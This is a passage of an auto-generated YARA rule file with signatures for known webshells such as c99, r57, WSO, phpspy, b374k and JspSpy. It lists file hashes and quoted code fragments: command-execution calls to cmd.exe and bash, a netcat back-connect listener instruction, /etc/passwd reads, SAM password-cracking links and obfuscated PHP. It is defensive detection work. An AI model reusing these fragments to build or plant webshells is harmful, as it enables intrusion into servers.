      hash1 = "5e3ed0fd9571701802cff84d529d0f339ad3d73ca1a7c707b1d5738961d9c191"
      hash2 = "677db2639e3b72d3f906336276e66df8bd6e249e95b4076165a2a813a70057be"
   strings:
      $x1 = "                    process = Runtime.getRuntime().exec(new String[] { \"cmd.exe\", \"/c\", s });" fullword ascii
      $s2 = "                    process = Runtime.getRuntime().exec(new String[] { \"/bin/bash\", \"-c\", s });" fullword ascii
      $s3 = "                InputStream inputStream = process.getInputStream();" fullword ascii
      $s4 = "                session.getBasicRemote().sendText(stringBuilder.toString());" fullword ascii
      $s5 = "                Process process;" fullword ascii
      $s6 = "                process.waitFor();" fullword ascii
      $s7 = "                while ((i = inputStream.read()) != -1)" fullword ascii
      $s8 = "        private Session session;" fullword ascii
      $s9 = "                boolean bool = System.getProperty(\"os.name\").toLowerCase().startsWith(\"windows\");" fullword ascii
      $s10 = "        public void onMessage(String s) {" fullword ascii
      $s11 = "            session.addMessageHandler(this);" fullword ascii
      $s12 = "            this.session = session;" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 10KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__2014_NEW_WebShell__1___2014_10_23_14_54_16__2013__NEW_WebShell____253 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, 2014.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, .asp, NEW WebShell.asp,  (1).asp, r00tsFSO.asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash3 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash4 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash5 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash6 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash7 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash8 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
      hash9 = "9f8fe38a42a615aa843f20a33ab83d433dd92eba7747a2c19567de0421405543"
   strings:
      $s1 = "Sub Scan(targetip, portNum)" fullword ascii
      $s2 = "If InStr(Err.description, \"(Connect()).\") > 0 Then" fullword ascii
      $s3 = "sub getTerminalInfo()" fullword ascii
      $s4 = "sub ScanPort()" fullword ascii
      $s5 = "sub ReadREG()" fullword ascii
      $s6 = "PortList=request.Form(\"port\")" fullword ascii
      $s7 = "if request.Form(\"port\")=\"\" then" fullword ascii
      $s8 = "IP=\"127.0.0.1\"" fullword ascii
      $s9 = "If request.Form(\"scan\") <> \"\" Then" fullword ascii
      $s10 = "Sub saTreeForMdb(thePath, rs, stream)" fullword ascii
      $s11 = "Dim item, theFolder, sysFileList" fullword ascii
      $s12 = "Function MainForm()" fullword ascii
      $s13 = "Sub createFolder(thePath)" fullword ascii
      $s14 = "Function fsoTreeForMdb(thePath, rs, stream)" fullword ascii
      $s15 = "if request.Form(\"ip\")=\"\" then" fullword ascii
      $s16 = "Sub addToMdb(thePath)" fullword ascii
      $s17 = "</font><br>\")" fullword ascii
      $s18 = "IP=request.Form(\"ip\")" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _angel_shell_phpspy_2005_full_2008_PHPSPY_phpspy_2006_2009lite_spy_lnc_2011_2013_2009mssql_phpspy_2005_lite_254 {
   meta:
      description = "webshell - from files angel.php, shell.php, phpspy_2005_full.php, 2008.php, PHPSPY.php, phpspy_2006.php, 2009lite.php, spy.php, lnc.php, 2011.php, 2013.php, 2009mssql.php, phpspy_2005_lite.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "61f8635790fa5873c4fbcf873e9e8ff18ce3ed0a5a68f464401118adac3f969a"
      hash2 = "64e6c08aa0b542481b86a91cdf1f50c9e88104a8a4572a8c6bd312a9daeba60e"
      hash3 = "c2b377ee1e465ed9acba15789b866d1a9a39b8880380367376332135e806a067"
      hash4 = "5c00d5b172f123e7eb9c0735b60fbaf48b22eec4c7560d9586d891d85e0b3db5"
      hash5 = "54bdd255c812288be22598090c1417b2d5d8c3558086c84150d7a62303352b2e"
      hash6 = "9269ad2472ecbabbc7b8e838312c71daa42eeadfd79c20f771107e848920c35e"
      hash7 = "61956e7a2fe44293ceaedc2e56ac52eee13064cd328fab1c5b314e5dc56012a6"
      hash8 = "e1c70ddcfbc56c7dff46ea03ed53aab3f022e53a6f8e98f12d8b8557cc6bfb4d"
      hash9 = "28e6e00c1851a30f0f847df7c21f371b41f815150011b1b2d7b8d5ef060a2900"
      hash10 = "8fcb2efc5be0f0ac3aa7ac7c40a16418f193daad04920977c415917617f9b936"
      hash11 = "106c686e2688535d2ff747203fdec675096fc9287655f833485520ae5e8365bb"
      hash12 = "77b769be4387a43095812683ce1759814aba6e12792a26e1cf0bb8b4156cd80d"
      hash13 = "3c7f22c9123e04109df7ec11a9a94cc1b552d0ab33f2b2e5e35deacf27841f2c"
   strings:
      $s1 = "loginpage();" fullword ascii
      $s2 = "function loginpage() {" fullword ascii
      $s3 = "$totaltime = number_format(($mtime[1] + $mtime[0] - $starttime), 6);" fullword ascii
      $s4 = "}//end shell" fullword ascii
      $s5 = "$contents=htmlspecialchars($contents);" fullword ascii
      $s6 = "$file_i++;" fullword ascii
      $s7 = "function debuginfo() {" fullword ascii
      $s8 = "}//end editfile" fullword ascii
      $s9 = "function deltree($deldir) {" fullword ascii
      $s10 = "global $starttime;" fullword ascii
      $s11 = "/*===================== " fullword ascii
      $s12 = " =====================*/" fullword ascii
      $s13 = "$dir_i++;" fullword ascii
      $s14 = "/*======================================================" fullword ascii
      $s15 = "}//end phpenv" fullword ascii
      $s16 = "}// end dir" fullword ascii
      $s17 = "======================================================*/" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_1_wso_4_2_2_255 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.1.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash4 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "echo '<span>Copy (read file)</span><form onsubmit=\\'g(null,null,\"1\",this.param.value);return false;\\'><input class=\"toolsIn" ascii
      $s2 = " /etc/passwd)</span><table><form onsubmit=\\'g(null,null,\"5\",this.param1.value,this.param2.value);return false;\\'><tr><td>Fro" ascii
      $s3 = "e><input type=submit value=\">>\"></form><br><br><span>Imap_open (read file)</span><form onsubmit=\\'g(null,null,\"6\",this.para" ascii
      $s4 = "turn false;\\'><input class=\"toolsInp\" type=text name=param><input type=submit value=\">>\"></form><br><span>Posix_getpwuid (" ascii
      $s5 = "nput type=submit value=\">>\"></form><br><span>Ini_restore (read file)</span><form onsubmit=\\'g(null,null,\"4\",this.param.valu" ascii
      $s6 = "input[type='button']:hover{background-color:#0663D5;}" fullword ascii
      $s7 = "d><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></tabl" ascii
      $s8 = "pe=text name=param><input type=submit value=\">>\"></form><br><span>Glob (list dir)</span><form onsubmit=\\'g(null,null,\"2\",th" ascii
      $s9 = "ue);return false;\\'><input type=text name=param><input type=submit value=\">>\"></form>';" fullword ascii
      $s10 = "ram.value);return false;\\'><input class=\"toolsInp\" type=text name=param><input type=submit value=\">>\"></form><br><span>Curl" ascii
      $s11 = "<td><form onsubmit=\\\"\".(function_exists('actionFilesTools')? \"g('FilesTools',null,this.f.value);\":'' ).\"return false;\\\">" ascii
      $s12 = "<td><form onsubmit=\\\"\".( function_exists('actionFilesMan')? \"g('FilesMan',null,'mkdir',this.d.value);\":'' ).\"return false;" ascii
      $s13 = "<td><form onsubmit=\\\"\".( function_exists('actionFilesTools')? \"g('FilesTools',null,this.f.value,'mkfile');\":'' ).\"return f" ascii
      $s14 = "d file)</span><form onsubmit=\\'g(null,null,\"3\",this.param.value);return false;\\'><input class=\"toolsInp\" type=text name=pa" ascii
      $s15 = "an>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d required><input type=submit value='>>'></form></td>" fullword ascii
      $s16 = "\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f required><input type=submit value='>>'></form" ascii
      $s17 = "ad file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='>>'></form></td>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _newsh_c99v2_c99shell_Shell__ci___Biz_was_here_c99_256 {
   meta:
      description = "webshell - from files newsh.php, c99v2.php, c99shell.php, Shell [ci] .Biz was here.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "60a4730f359762d973d9cfc00093cdbddaa2ce4ca4c4e113a57c73e44353d93c"
      hash2 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "\"uSrQEQwkGjYkQCTAy6AlUMhWklQBw4MEhgSA6XPgRxS5ii40KLFgi4BGTEKAsCKXihESCzrsgSQC\"." fullword ascii
      $s2 = "\"t0hkyZ3Q6qloZ7JimomVEb+uXAAAOw==\"," fullword ascii
      $s3 = "\"9ZOWwX6Is3WIu5im07rJ9J2t2Zek0m57rpqo1nKCtUVrtYir3vf6/46v4Yuu4WZvfr7P6sPS6sDQ\"." fullword ascii
      $s4 = "\"aQgoDNCCSB4EAnImCiSBjUyGLobgXBTpkAA5I6pgmSkDz5cuMSz8yWlAyoCZFGb4SQKhASMBXJpM\"." fullword ascii
      $s5 = " $images = array(" fullword ascii
      $s6 = "\"p9Pm/GVufc7j/MzV/9Xm/EOm99bn/Njp/a7Q+tTm/LHS+eXw/t3r/Nnp/djo/Nrq/fj7/9vq/Nfo\"." fullword ascii
      $s7 = "\"24Oi1a3B45Sy4ae944Ccz4Sj1n2GlgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"." fullword ascii
      $s8 = "\"R0lGODlhEAAQAAAAACH5BAEAAAEALAAAAAAQABAAgAAAAAAAAAImDA6hy5rW0HGosffsdTpqvFlg\"." fullword ascii
      $s9 = "\"wr3N86/D8KvB8F9neEFotEBntENptENptSxUpx1IoDlfrTRcrZeeyZacxpmhzIuRtpWZxIuOuKqz\"." fullword ascii
      $s10 = "\"66XB6cjZ8a/K79/s/dbn/ezz/czd9mN0jKTB6ai/76W97niXz2GCwV6AwUdstXyVyGSDwnmYz4io\"." fullword ascii
      $s11 = "\"yAsokBkQADs=\"," fullword ascii
      $s12 = "\"AAjnACtVCkCw4JxJAQQqFBjAxo0MNGqsABQAh6CFA3nk0MHiRREVDhzsoLQwAJ0gT4ToecSHAYMz\"." fullword ascii
      $s13 = "\"/e31/uDu/dzr/Orz/eHu/fX6/vH4/v////v+/3ez6vf7//T5/kGS4Pv9/7XV+rHT+r/b+rza+vP4\"." fullword ascii
      $s14 = "\"/Mbe+8rh/Mng+7jW+rvY+r7Z+7XR9dDk/NHk/NLl/LTU+rnX+8zi/LbV++fx/e72/vH3/vL4/u31\"." fullword ascii
      $s15 = "\"/uz0/urz/u71/uvz/dTn/M/k/N3s/dvr/cjg+8Pd+8Hc+sff+8Te+/D2/rXI8rHF8brM87fJ8nmP\"." fullword ascii
      $s16 = "\"R0lGODlhEAAQAHcAACH5BAEAAJUALAAAAAAQABAAhwAAAIep3BE9mllic3B5iVpjdMvh/MLc+y1U\"." fullword ascii
      $s17 = "\"yIkUV+SqOYLCA4csAup86OGDkNw4BpQ4OaBFgB0TEyIUKqDwTRs4a9yMCSOmDBoyZu4sJKCgwIDj\"." fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_c99shell_Shell__ci___Biz_was_here_c99_locus7s_c99_257 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, c99shell.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "d08c928417669a722d324df5ea1448b65637b2e109c704556e3870dcfe07fee1"
      hash4 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash5 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash6 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "/select><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td></tr>" ascii
      $s2 = "o htmlspecialchars($cmd); ?>\"><input type=hidden name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Exec" ascii
      $s3 = "Click \"Connect\" only after open port for it. You should use NetCat&copy;, run \"<b>nc -l -n -v -p <?php echo $bc_port; ?></b>" ascii
      $s4 = "Click \"Connect\" only after open port for it. You should use NetCat&copy;, run \"<b>nc -l -n -v -p <?php echo $bc_port; ?></b>" ascii
      $s5 = "alue=\\\"1\\\"><br><br>Logging?&nbsp;<input type=\\\"checkbox\\\" name=\\\"fqb_logging\\\" value=\\\"1\\\" checked><br>Logging t" ascii
      $s6 = "put type=\\\"text\\\" name=\\\"fqb_logfile\\\" value=\\\"\".$logfile.\"\\\" size=\\\"\".(strlen($logfile)+2*(strlen($logfile)/10" ascii
      $s7 = "T\"><input type=hidden name=act value=\"cmd\"><input type=hidden name=\"d\" value=\"<?php echo $dispd; ?>\"><select name=\"cmd\"" ascii
      $s8 = "g to e-mail?&nbsp;<input type=\\\"text\\\" name=\\\"fqb_logemail\\\" value=\\\"\".$log_email.\"\\\" size=\\\"\".(strlen($logemai" ascii
      $s9 = "/form></td><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Select: </b><form action=\"<?php echo $surl; ?>act=cmd\" met" ascii
      $s10 = "t value=\"cmd\"><input type=hidden name=\"d\" value=\"<?php echo $dispd; ?>\"><input type=\"text\" name=\"cmd\" size=\"50\" valu" ascii
      $s11 = "  else {echo \"<b><font color=green>You can crack winnt passwords. <a href=\\\"\".$surl.\"act=f&f=sam&d=\".$_SERVER[\"WINDIR\"]." ascii
      $s12 = "reach ($cmdaliases as $als) {echo \"<option value=\\\"\".htmlspecialchars($als[1]).\"\\\">\".htmlspecialchars($als[0]).\"</optio" ascii
      $s13 = "<b>Search for (file/folder name): </b><input type=\\\"text\\\" name=\\\"search_name\\\" size=\\\"\".round(strlen($search_name)+2" ascii
      $s14 = "  echo \"<center><b>Listing folder (\".count($tab[\"files\"]).\" files and \".(count($tab[\"folders\"])+count($tab[\"links\"]))." ascii
      $s15 = "e=\\\"\".htmlspecialchars($search_name).\"\\\">&nbsp;<input type=\\\"checkbox\\\" name=\\\"search_name_regexp\\\" value=\\\"1" ascii
      $s16 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>Enter: </b><form action=\"<?php echo $surl; ?>\"><input type=hidden" ascii
      $s17 = "r><br>" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _php_niu_3_no2_258 {
   meta:
      description = "webshell - from files php_niu_3.php, no2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "24ad7ac832d9b239ea472a4e01b173d8e6e6d1e1c947395af5152f0d9e701201"
      hash2 = "134e4ee94191732026c93112512f16653a5c4ae03593e357b8d4126e232267a1"
   strings:
      $s1 = "$_=@\"$_\"; // $_='Array';" fullword ascii
      $s2 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R" fullword ascii
      $s3 = "$_=$$____;" fullword ascii
      $s4 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;" fullword ascii
      $s5 = "$_=$_['!'=='@']; // $_=$_[0];" fullword ascii
      $s6 = "$___=$_; // A" fullword ascii
      $s7 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S" fullword ascii
      $s8 = "$__=$_;" fullword ascii
      $s9 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P" fullword ascii
      $s10 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O" fullword ascii
      $s11 = "$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T" fullword ascii
      $s12 = "$____='_';" fullword ascii
      $s13 = "$__++;$__++;$__++;$__++; // E " fullword ascii
      $s14 = "$_=[];" fullword ascii
      $s15 = "$____.=$__;" fullword ascii
      $s16 = "$___.=$__; // S" fullword ascii
      $s17 = "$___.=$__;" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 3KB and ( 8 of them )
      ) or ( all of them )
}

rule _c5_m_he1p_1_nogfw_JspSpy1_403_luci_jsp_spy2009_queryDong_myxx1_a_config_JspSpyJDK5_JspSpyJDK51_u_000_t00ls1_css_807_jspspy__259 {
   meta:
      description = "webshell - from files c5.jsp, m.jsp, he1p.jsp, 1.jsp, nogfw.jsp, JspSpy1.jsp, 403.jsp, luci.jsp.spy2009.jsp, queryDong.jsp, myxx1.jsp, a.jsp, config.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, u.jsp, 000.jsp, t00ls1.jsp, css.jsp, 807.jsp, jspspy_k8.jsp, jspspy.jsp, zend.jsp, t00ls.jsp, ma3.jsp, spyjsp2010.jsp, ok.jsp, hideShell.jsp, style.jsp, cofigrue.jsp, dm.jsp, xia.jsp, x7.jsp, mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash3 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
      hash4 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
      hash5 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
      hash6 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
      hash7 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash8 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
      hash9 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash10 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
      hash11 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
      hash12 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash13 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash14 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
      hash15 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
      hash16 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash17 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash18 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
      hash19 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash20 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash21 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
      hash22 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
      hash23 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash24 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
      hash25 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash26 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
      hash27 = "95e97a480447aa0ab0e679af117178e56490d9fb7b4b9ec0ed26efbeede56eb3"
      hash28 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
      hash29 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash30 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash31 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
      hash32 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
      hash33 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $s1 = "public void parseRequest(HttpServletRequest request) throws IOException {" fullword ascii
      $s2 = "<%@page import=\"java.util.zip.*\"%>" fullword ascii
      $s3 = "fileName = tF.getName();" fullword ascii
      $s4 = "s = s.substring(k + 10);" fullword ascii
      $s5 = "private String fileName = null;" fullword ascii
      $s6 = "private byte[] b = new byte[1024];" fullword ascii
      $s7 = "private ServletInputStream sis = null;" fullword ascii
      $s8 = "out.write(b, 0, a);" fullword ascii
      $s9 = "upload();" fullword ascii
      $s10 = "private static class UploadBean {" fullword ascii
      $s11 = "s = s.substring(0, k);" fullword ascii
      $s12 = "File tF = new File(s);" fullword ascii
      $s13 = "if (tF.isAbsolute()) {" fullword ascii
      $s14 = "k = s.lastIndexOf(\".\");" fullword ascii
      $s15 = "fileName = s;" fullword ascii
      $s16 = "s = new String(b, 0, a);" fullword ascii
      $s17 = "k = s.indexOf(\"\\\"\");" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _4_0_2013110125027897__2014_2014_4_0__1__2013__2012____1__260 {
   meta:
      description = "webshell - from files 4.0.asp, 2013110125027897.asp, _2014.asp, 2014.asp, 4.0 (1).asp, 2013.asp, _2012.asp, .asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "291f142cf50354c5f224c02823c6f752fe9b73ea120829c357cda51719efbf80"
      hash2 = "aa77ff5d79dbbe7fb143ff3609814d84d72d4d057188954bfdf72f282733b5b8"
      hash3 = "dbe7c6efd138b10ccbec38547eea33e8fefd21f9210378107c268d02f844ef5e"
      hash4 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash5 = "bd4aea1c2f8cbf4910acc7ae124482299e64b6fed9bf41bbc8e7e7441b195528"
      hash6 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash7 = "608a7c994916084ff0f91b3dbe31a52763eab03ee2dd35dbc14592cc7bf7a096"
      hash8 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash9 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "RndFilename = \"\\temp\" & Day(now) & Hour(now) & Minute(now) & Second(now) & \".tmp\"" fullword ascii
      $s2 = "Set TestFolder = FSO.GetFolder(folder)" fullword ascii
      $s3 = "FSO.DeleteFile folder & RndFilename,True" fullword ascii
      $s4 = "FSO.CreateTextFile folder & RndFilename,True" fullword ascii
      $s5 = "For Each A in TestFileList" fullword ascii
      $s6 = "Dim FSO,TestFolder,TestFileList,ReWrStr,RndFilename" fullword ascii
      $s7 = "function goback()" fullword ascii
      $s8 = "ReWrStr = ReWrStr & \"" fullword ascii
      $s9 = "'\"\">\":cxd=\"<font face='wingdings'>8</font>\":ef=\"</a></td></tr>\"" fullword ascii
      $s10 = "Set TestFileList = TestFolder.SubFolders" fullword ascii
      $s11 = "Set TestFolder = Nothing" fullword ascii
      $s12 = "ReWrStr = folder & \"<FONT color=#ff2222> " fullword ascii
      $s13 = "ReWrStr = folder & \"<FONT color=#dddddd> " fullword ascii
      $s14 = "Set TestFileList = Nothing" fullword ascii
      $s15 = "Function ScReWr(folder)" fullword ascii
      $s16 = "ScReWr = ReWrStr" fullword ascii
      $s17 = "If err Then" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_8_source_b374k_3_2_2_b374k_3_2_3_b374k_2_7_source_261 {
   meta:
      description = "webshell - from files b374k-2.8.source.php, b374k-3.2.2.php, b374k-3.2.3.php, b374k-2.7.source.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8c30f0ad13f188cb24481bc28512e8f71fd4188d6c6020cfe0c26f43a8233d91"
      hash2 = "72c6af6a4be99e31c4a7a0aa4f01750792788e7f6f9749243a9f2c47c14a708f"
      hash3 = "53fe44b4753874f079a936325d1fdc9b1691956a29c3aaf8643cdbd49f5984bf"
      hash4 = "d31034d5e4fd8d5d8efe640c4d2aa7ac43c71989f84fb4e92606a18563b3fd5e"
   strings:
      $s1 = "if(function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc()){" fullword ascii
      $s2 = "2 => array(\"pipe\", \"w\"));" fullword ascii
      $s3 = "\"/etc/httpd/conf/httpd.conf\", \"/usr/local/apache2/conf/httpd.conf\", \" /etc/apache2/apache2.conf\", \"/etc/apache2/httpd.con" ascii
      $s4 = "\"/etc/httpd/conf/httpd.conf\", \"/usr/local/apache2/conf/httpd.conf\", \" /etc/apache2/apache2.conf\", \"/etc/apache2/httpd.con" ascii
      $s5 = "$quotes_sybase = strtolower(ini_get('magic_quotes_sybase'));" fullword ascii
      $s6 = "nf\", \"/etc/apache2/httpd2.conf\", \"/etc/httpd/httpd.conf\"," fullword ascii
      $s7 = "\"/proc/version\", \"/etc/resolv.conf\", \"/etc/sysctl.conf\"," fullword ascii
      $s8 = "while(($f = readdir($dh))!==false){" fullword ascii
      $s9 = "sr/pkg/etc/httpd/httpd.conf\", \"/usr/local/etc/apache22/httpd.conf\", \"/usr/local/etc/apache2/httpd.conf\", \"/var/www/conf/ht" ascii
      $s10 = "<div id='navigation'>" fullword ascii
      $s11 = "<div id='content'>" fullword ascii /* Goodware String - occured 1 times */
      $s12 = "foreach($arr as $k=>$v){" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57shell_r57_Mohajer22_r57_kartal_r57_r57_iFX_262 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57shell.php, r57_Mohajer22.php, r57_kartal.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash4 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash5 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash6 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash7 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
